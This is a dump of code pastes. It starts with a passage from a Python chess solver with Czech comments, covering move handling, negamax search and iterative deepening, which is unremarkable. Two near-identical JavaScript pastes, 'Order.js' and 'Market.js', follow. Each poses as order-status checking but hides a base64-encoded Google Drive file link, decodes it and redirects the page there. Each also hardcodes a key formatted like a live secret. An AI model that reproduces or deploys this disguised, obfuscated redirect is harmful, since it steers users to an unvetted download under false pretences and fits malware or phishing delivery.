        if not is_in_check(board, side):
            legal_moves.append(move)
        undo_move(board)
    return legal_moves

# Zásobník pro tahy (pro undo)
move_stack = []

def make_move(move, board):
    """"""Provede tah na šachovnici a uloží stav pro možnost undo.
       move: (r1, c1, r2, c2, promo, special)""""""
    r1, c1, r2, c2, promo, special = move
    piece = board.grid[r1][c1]
    captured = board.grid[r2][c2] if special != 'enpassant' else ('p' if piece=='P' else 'P')
    prev_state = (set(board.castling_rights), board.en_passant)
    move_stack.append((r1, c1, r2, c2, promo, special, piece, captured, prev_state))
    board.grid[r1][c1] = '.'
    if special == 'castle':
        board.grid[r2][c2] = piece
        if piece == 'K':
            if c2 == 6:
                board.grid[7][5] = 'R'; board.grid[7][7] = '.'
            else:
                board.grid[7][3] = 'R'; board.grid[7][0] = '.'
        else:
            if c2 == 6:
                board.grid[0][5] = 'r'; board.grid[0][7] = '.'
            else:
                board.grid[0][3] = 'r'; board.grid[0][0] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = piece
        if piece == 'P':
            board.grid[r2+1][c2] = '.'
        else:
            board.grid[r2-1][c2] = '.'
    else:
        board.grid[r2][c2] = promo if promo else piece
    if piece == 'K':
        board.castling_rights.discard('K'); board.castling_rights.discard('Q')
    if piece == 'k':
        board.castling_rights.discard('k'); board.castling_rights.discard('q')
    if piece == 'R' and (r1, c1)==(7,7):
        board.castling_rights.discard('K')
    if piece == 'R' and (r1, c1)==(7,0):
        board.castling_rights.discard('Q')
    if piece == 'r' and (r1, c1)==(0,7):
        board.castling_rights.discard('k')
    if piece == 'r' and (r1, c1)==(0,0):
        board.castling_rights.discard('q')
    if special == 'double':
        board.en_passant = (r1 + (-1 if board.to_move=='w' else 1), c1)
    else:
        board.en_passant = None
    board.to_move = 'b' if board.to_move=='w' else 'w'

def undo_move(board):
    """"""Vrátí poslední provedený tah.""""""
    r1, c1, r2, c2, promo, special, piece, captured, prev_state = move_stack.pop()
    board.grid[r1][c1] = piece
    if special == 'castle':
        board.grid[r2][c2] = '.'
        if piece == 'K':
            if c2 == 6:
                board.grid[7][7] = 'R'; board.grid[7][5] = '.'
            else:
                board.grid[7][0] = 'R'; board.grid[7][3] = '.'
        else:
            if c2 == 6:
                board.grid[0][7] = 'r'; board.grid[0][5] = '.'
            else:
                board.grid[0][0] = 'r'; board.grid[0][3] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = '.'
        if piece == 'P':
            board.grid[r2+1][c2] = 'p'
        else:
            board.grid[r2-1][c2] = 'P'
    else:
        board.grid[r2][c2] = captured
    board.castling_rights, board.en_passant = prev_state
    board.to_move = 'b' if board.to_move=='w' else 'w'

###############################################################################
# Jednoduchá funkce pro zjištění, zda je mat v určité hloubce 
# (pro pomoc s detekcí matů za určitý počet tahů)
###############################################################################

def is_mate_in_n(board, side, depth):
    """"""Zkontroluje, zda je pozice mat (pro stranu side) v zadané hloubce.""""""
    if depth == 0:
        # Kontrola matu
        legal_moves = get_legal_moves(board, side)
        return not legal_moves and is_in_check(board, side)
    
    # Rekurzivní kontrola pro stranu side (zda má vynucený mat)
    legal_moves = get_legal_moves(board, side)
    
    if not legal_moves:
        return False  # Nemáme tahy, nemůžeme dát mat
    
    # Zkontrolujeme všechny tahy, musí existovat alespoň jeden, který vede k matu
    opponent = 'b' if side=='w' else 'w'
    for move in legal_moves:
        make_move(move, board)
        # Pro všechny odpovědi protivníka musí být mat
        opponent_can_avoid_mate = False
        opponent_legal_moves = get_legal_moves(board, opponent)
        
        if not opponent_legal_moves:
            # Protivník nemá tahy - buď je to mat nebo pat
            if is_in_check(board, opponent):
                undo_move(board)
                return True  # Již nyní máme mat
            # Jinak je to pat a to není výhra
        
        # Pokud má protivník tahy, musíme prověřit všechny
        for op_move in opponent_legal_moves:
            make_move(op_move, board)
            if not is_mate_in_n(board, side, depth-1):
                opponent_can_avoid_mate = True
            undo_move(board)
            if opponent_can_avoid_mate:
                break
        
        undo_move(board)
        
        # Pokud protivník nemůže vyhnout matu, máme mat za 'depth' tahů
        if not opponent_can_avoid_mate:
            return True
    
    return False

###############################################################################
# Negamax s alfa-beta ořezáváním pro hledání nejlepší sekvence
###############################################################################

def negamax(board, depth, alpha, beta, side):
    """"""Negamax s alfa-beta ořezáváním.
       side: 1 pro bílého, -1 pro černého.
       Vrací (hodnota, tahová sekvence).""""""
    # Koncové podmínky - mat (nebo pat když depth=0)
    curr_color = 'w' if side == 1 else 'b'
    legal_moves = get_legal_moves(board, curr_color)
    
    # Kontrola na mat nebo pat (terminální stavy)
    if not legal_moves:
        if is_in_check(board, curr_color):
            return -inf, []  # Mat
        return 0, []  # Pat
    
    # Dosáhli jsme maximální hloubky - základní ohodnocení
    if depth == 0:
        # Kontrola, zda máme mat v nejbližších tazích
        enemy_color = 'b' if curr_color == 'w' else 'w'
        for move in legal_moves:
            make_move(move, board)
            enemy_legal_moves = get_legal_moves(board, enemy_color)
                
            if not enemy_legal_moves and is_in_check(board, enemy_color):
                undo_move(board)
                return inf, [move]  # Našli jsme mat
            undo_move(board)
        
        # Pro jednoduchost zde neohodnocujeme materiál, pozici atd.
        # V reálném šachovém enginu bychom zde vraceli pozici na základě materiálu, struktury pěšců atd.
        return 0, []
    
    best_val = -inf
    best_line = []
    
    # Seřazení tahů pro alfa-beta
    legal_moves.sort(key=lambda m: 1 if board.grid[m[2]][m[3]] != '.' else 0, reverse=True)
    
    for move in legal_moves:
        make_move(move, board)
        val, line = negamax(board, depth-1, -beta, -alpha, -side)
        val = -val
        undo_move(board)
        
        if val > best_val:
            best_val = val
            best_line = [move] + line
        
        alpha = max(alpha, best_val)
        if alpha >= beta:
            break
    
    return best_val, best_line

###############################################################################
# Iterativní prohlubování – hledáme do maximální hloubky a vypisujeme uplynulý čas
###############################################################################

def iterative_deepening(board, max_depth=50, time_limit=300):
    """"""Iterativní prohlubování s časovým limitem (výchozí 5 minut).""""""
    global running, start_time
    
    # Spuštění časovacího vlákna
    running = True
    start_time = time.time()
    timer_thread = threading.Thread(target=time_reporter)
    timer_thread.daemon = True
    timer_thread.start()
    
    best_line = []
    best_val = 0
    
    try:
        # Nejdříve zkontrolujeme, zda máme vůbec nějaké legální tahy
        curr_side = board.to_move
        enemy_side = 'b' if curr_side=='w' else 'w'
        
        legal_moves = get_legal_moves(board, curr_side)
        
        # Pokud nemáme žádné legální tahy, je to pat nebo mat
        if not legal_moves:
            total_elapsed = time.time() - start_time
            running = False
            if is_in_check(board, curr_side):
                return -inf, [], total_elapsed  # Mat
            return 0, [], total_elapsed  # Pat
        
        # Zkontrolujeme, zda máme mat v jednom tahu
        for move in legal_moves:
            make_move(move, board)
            enemy_legal = get_legal_moves(board, enemy_side)
            
            if not enemy_legal and is_in_check(board, enemy_side):
                # Našli jsme mat v jednom tahu
                undo_move(board)
                running = False
                return inf, [move], 0.1
            undo_move(board)
        
        # Pokud máme jen jeden legální tah, vrátíme ho bez dalšího počítání
        if len(legal_moves) == 1:
            running = False
            return 0, legal_moves, 0.1
        
        # Nyní začněme iterativní prohlubování
        for depth in range(1, max_depth+1):
            t0 = time.time()
            val, line = negamax(board, depth, -inf, inf, 1 if board.to_move=='w' else -1)
            t1 = time.time()
            elapsed = time.time() - start_time
            
            # Výpis času po dosažení každé hloubky
            hrs = int(elapsed // 3600)
            mins = int((elapsed % 3600) // 60)
            secs = int(elapsed % 60)
            
            # Po výpisu každé hloubky přejdeme na nový řádek
            move_time = t1 - t0
            sys.stdout.write(""\n"")  # Nový řádek po časovém informačním řádku
            print(f""Hloubka {depth:2d} – uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s (poslední krok: {move_time:.2f}s)"")
            
            # Zobrazení aktuální nejlepší pozice pro tuto hloubku
            if line:
                print(f""\nNejlepší sekvence v hloubce {depth}:"")
                variant_board = board.copy()
                move = line[0]  # Vezmeme pouze první tah
                make_move(move, variant_board)
                print(f""Tah: {move_to_notation(move)}"")
                print(variant_board.display())
                print(""-"" * 40)
            else:
                print(""\nŽádná nalezená sekvence v této hloubce."")
            
            # Aktualizujeme nejlepší nalezenou sekvenci
            best_val = val
            best_line = line
            
            # Pokud jsme našli vynucený mat nebo pat, končíme
            if abs(val) == inf or time.time() - start_time > time_limit:
                if time.time() - start_time > time_limit:
                    print(f""Časový limit vypršel po {time_limit} sekundách"")
                break
        
        # Ověření, že když máme tahy, tak vrátíme nejlepší z nich (i když je remíza)
        if not best_line and legal_moves:
            best_line = [legal_moves[0]]
                
        total_elapsed = time.time() - start_time
        return best_val, best_line, total_elapsed
    
    finally:
        # Zajistíme ukončení časovacího vlákna
        running = False
        timer_thread.join(timeout=1.0)
        # Přejdeme na nový řádek po posledním časovém výpisu
        sys.stdout.write(""\n"")
        sys.stdout.flush()

###############################################################################
# Testovací funkce pro kontrolu, zda jsou tahy e4 správně generovány
###############################################################################

def debug_king_moves(fen=""8/8/8/8/8/kq2K3/8/8 w - - 0 1""):
    """"""Testovací funkce pro zobrazení generovaných tahů krále.""""""
    board = Board(fen)
    print(""Pozice:"")
    print(board.display())
    
    side = board.to_move
    king_pos = find_king(board, side)
    if not king_pos:
        print(""Král nenalezen!"")
        return
    
    kr, kc = king_pos
    print(f""Král na pozici: {'abcdefgh'[kc]}{8-kr} ({kr},{kc})"")
    
    # Generujeme tahy krále
    king_moves = []
    for dr in [-1, 0, 1]:
        for dc in [-1, 0, 1]:
            if dr == 0 and dc == 0:
                continue
            nr, nc = kr + dr, kc + dc
            if 0 <= nr < 8 and 0 <= nc < 8:
                king_moves.append((nr, nc))
    
    print(""Možné tahy krále:"")
    for nr, nc in king_moves:
        # Zjistíme, zda je tam vlastní figura
        piece = board.grid[nr][nc]
        enemy_side = 'b' if side == 'w' else 'w'
        attacked = is_square_attacked(board, nr, nc, enemy_side)
        
        status = """"
        if piece != '.':
            is_own = (side == 'w' and piece.isupper()) or (side == 'b' and piece.islower())
            if is_own:
                status = ""vlastní figura""
            else:
                status = f""soupeřova figura {piece}""
        
        if attacked:
            status += "" (napadeno)""
        
        if not status:
            status = ""volné pole""
        
        print(f""  {'abcdefgh'[nc]}{8-nr} ({nr},{nc}): {status}"")
    
    # Generování legálních tahů pomocí generate_pseudo_moves
    print(""\nLegální tahy podle generate_pseudo_moves:"")
    moves = generate_pseudo_moves(board, side)
    king_moves = []
    for move in moves:
        r1, c1, r2, c2, _, _ = move
        if r1 == kr and c1 == kc:
            king_moves.append(move)
    
    for move in king_moves:
        r1, c1, r2, c2, _, _ = move
        make_move(move, board)
        in_check = is_in_check(board, side)
        undo_move(board)
        
        print(f""  {'abcdefgh'[c1]}{8-r1} -> {'abcdefgh'[c2]}{8-r2}: {'nelegální (šach)' if in_check else 'legální'}"")

###############################################################################
# Převod tahu do šachové notace
###############################################################################

def move_to_notation(move):
    cols = ""abcdefgh""
    r1, c1, r2, c2, promo, special = move
    if special == 'castle':
        return ""O-O"" if c2 > c1 else ""O-O-O""
    s = cols[c1] + str(8 - r1) + cols[c2] + str(8 - r2)
    if promo:
        s += ""="" + promo.upper()
    if special == 'enpassant':
        s += "" e.p.""
    return s

###############################################################################
# Analýza pozice pro určení výsledku
###############################################################################

def analyze_position(board):
    """"""Analyzuje pozici a vrací výsledek.""""""
    # Zjistíme stranu na tahu
    side_to_move = board.to_move
    
    # Zjistíme, zda má strana na tahu legální tahy
    legal_moves = get_legal_moves(board, side_to_move)
    
    # Kontrola na mat nebo pat
    if not legal_moves:
        if is_in_check(board, side_to_move):
            if side_to_move == 'w':
                return ""Mat – černý vyhrává""
            else:
                return ""Mat – bílý vyhrává""
        else:
            return ""Pat (remíza)""
    
    # Zjistíme, zda po provedení tahu bude mat
    for move in legal_moves:
        make_move(move, board)
        opponent = 'b' if side_to_move == 'w' else 'w'
        opponent_legal_moves = get_legal_moves(board, opponent)
        
        if not opponent_legal_moves and is_in_check(board, opponent):
            undo_move(board)
            if side_to_move == 'w':
                return ""Mat v příštím tahu – bílý vyhrává""
            else:
                return ""Mat v příštím tahu – černý vyhrává""
        undo_move(board)
    
    # Pokud nemáme ani mat ani pat, pozice je otevřená
    return ""Pozice není rozhodnuta""

###############################################################################
# Hlavní program – inicializace z FEN a výpis optimální tahové sekvence
###############################################################################

def main():
    # Nastavíme pozici ze zadaného FEN
    fen = ""8/6A1/8/8/8/k1K5/8/8 w - - 0 1""
    fen = ""8/8/8/8/8/kq2K3/8/8 w - - 0 1""

    # Další příklad pozice
    #fen = ""8/8/8/8/8/kq2K3/6A1/8 w - - 0 1""
    
    # Nejprve spustíme debug pro ověření tahů krále
    print(""DEBUG TAHŮ KRÁLE:"")
    print(""-"" * 40)
    debug_king_moves(fen)
    print(""-"" * 40)
    
    board_obj = Board(fen)
    board = board_obj.copy()
    
    print(""Počáteční pozice:"")
    print(board.display())
    print(""\nVyhledávání optimální tahové sekvence – iterativní prohlubování...\n"")
    
    # Nastavíme časový limit na 5 minut (300 sekund)
    best_val, best_line, total_elapsed = iterative_deepening(board, max_depth=500, time_limit=inf)
    hrs = int(total_elapsed // 3600)
    mins = int((total_elapsed % 3600) // 60)
    secs = int(total_elapsed % 60)
    
    variant_board = board.copy()
    moves_notation = []
    print(""Postup tahů:"")
    print(""-""*40)
    print(""Start:"")
    print(variant_board.display())
    print(""-""*40)
    
    # Vykonání sekvence tahů a zobrazení průběhu
    for move in best_line:
        s = move_to_notation(move)
        moves_notation.append(s)
        make_move(move, variant_board)
        print(""Tah:"", s)
        print(variant_board.display())
        print(""-""*40)
    
    # Vyhodnocení výsledné pozice
    if best_val == inf:
        result_text = ""Mat – bílý vyhrává""
    elif best_val == -inf:
        result_text = ""Mat – černý vyhrává""
    else:
        # Pokud engine nenašel jednoznačný výsledek, analyzujeme pozici znovu
        result_text = analyze_position(variant_board)
    
    print(""Optimální tahová sekvence:"", "" "".join(moves_notation) if moves_notation else ""(žádný tah)"")
    print(""Výsledek:"", result_text)
    print(f""Celkový uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")

if __name__ == '__main__':
    main()"
SsLR5a9m,Order.js,navrajkhunger,JavaScript,Tuesday 1st of April 2025 03:54:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/312/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7BRgXpr5,Market.js,navrajkhunger,JavaScript,Tuesday 1st of April 2025 03:38:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/862/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
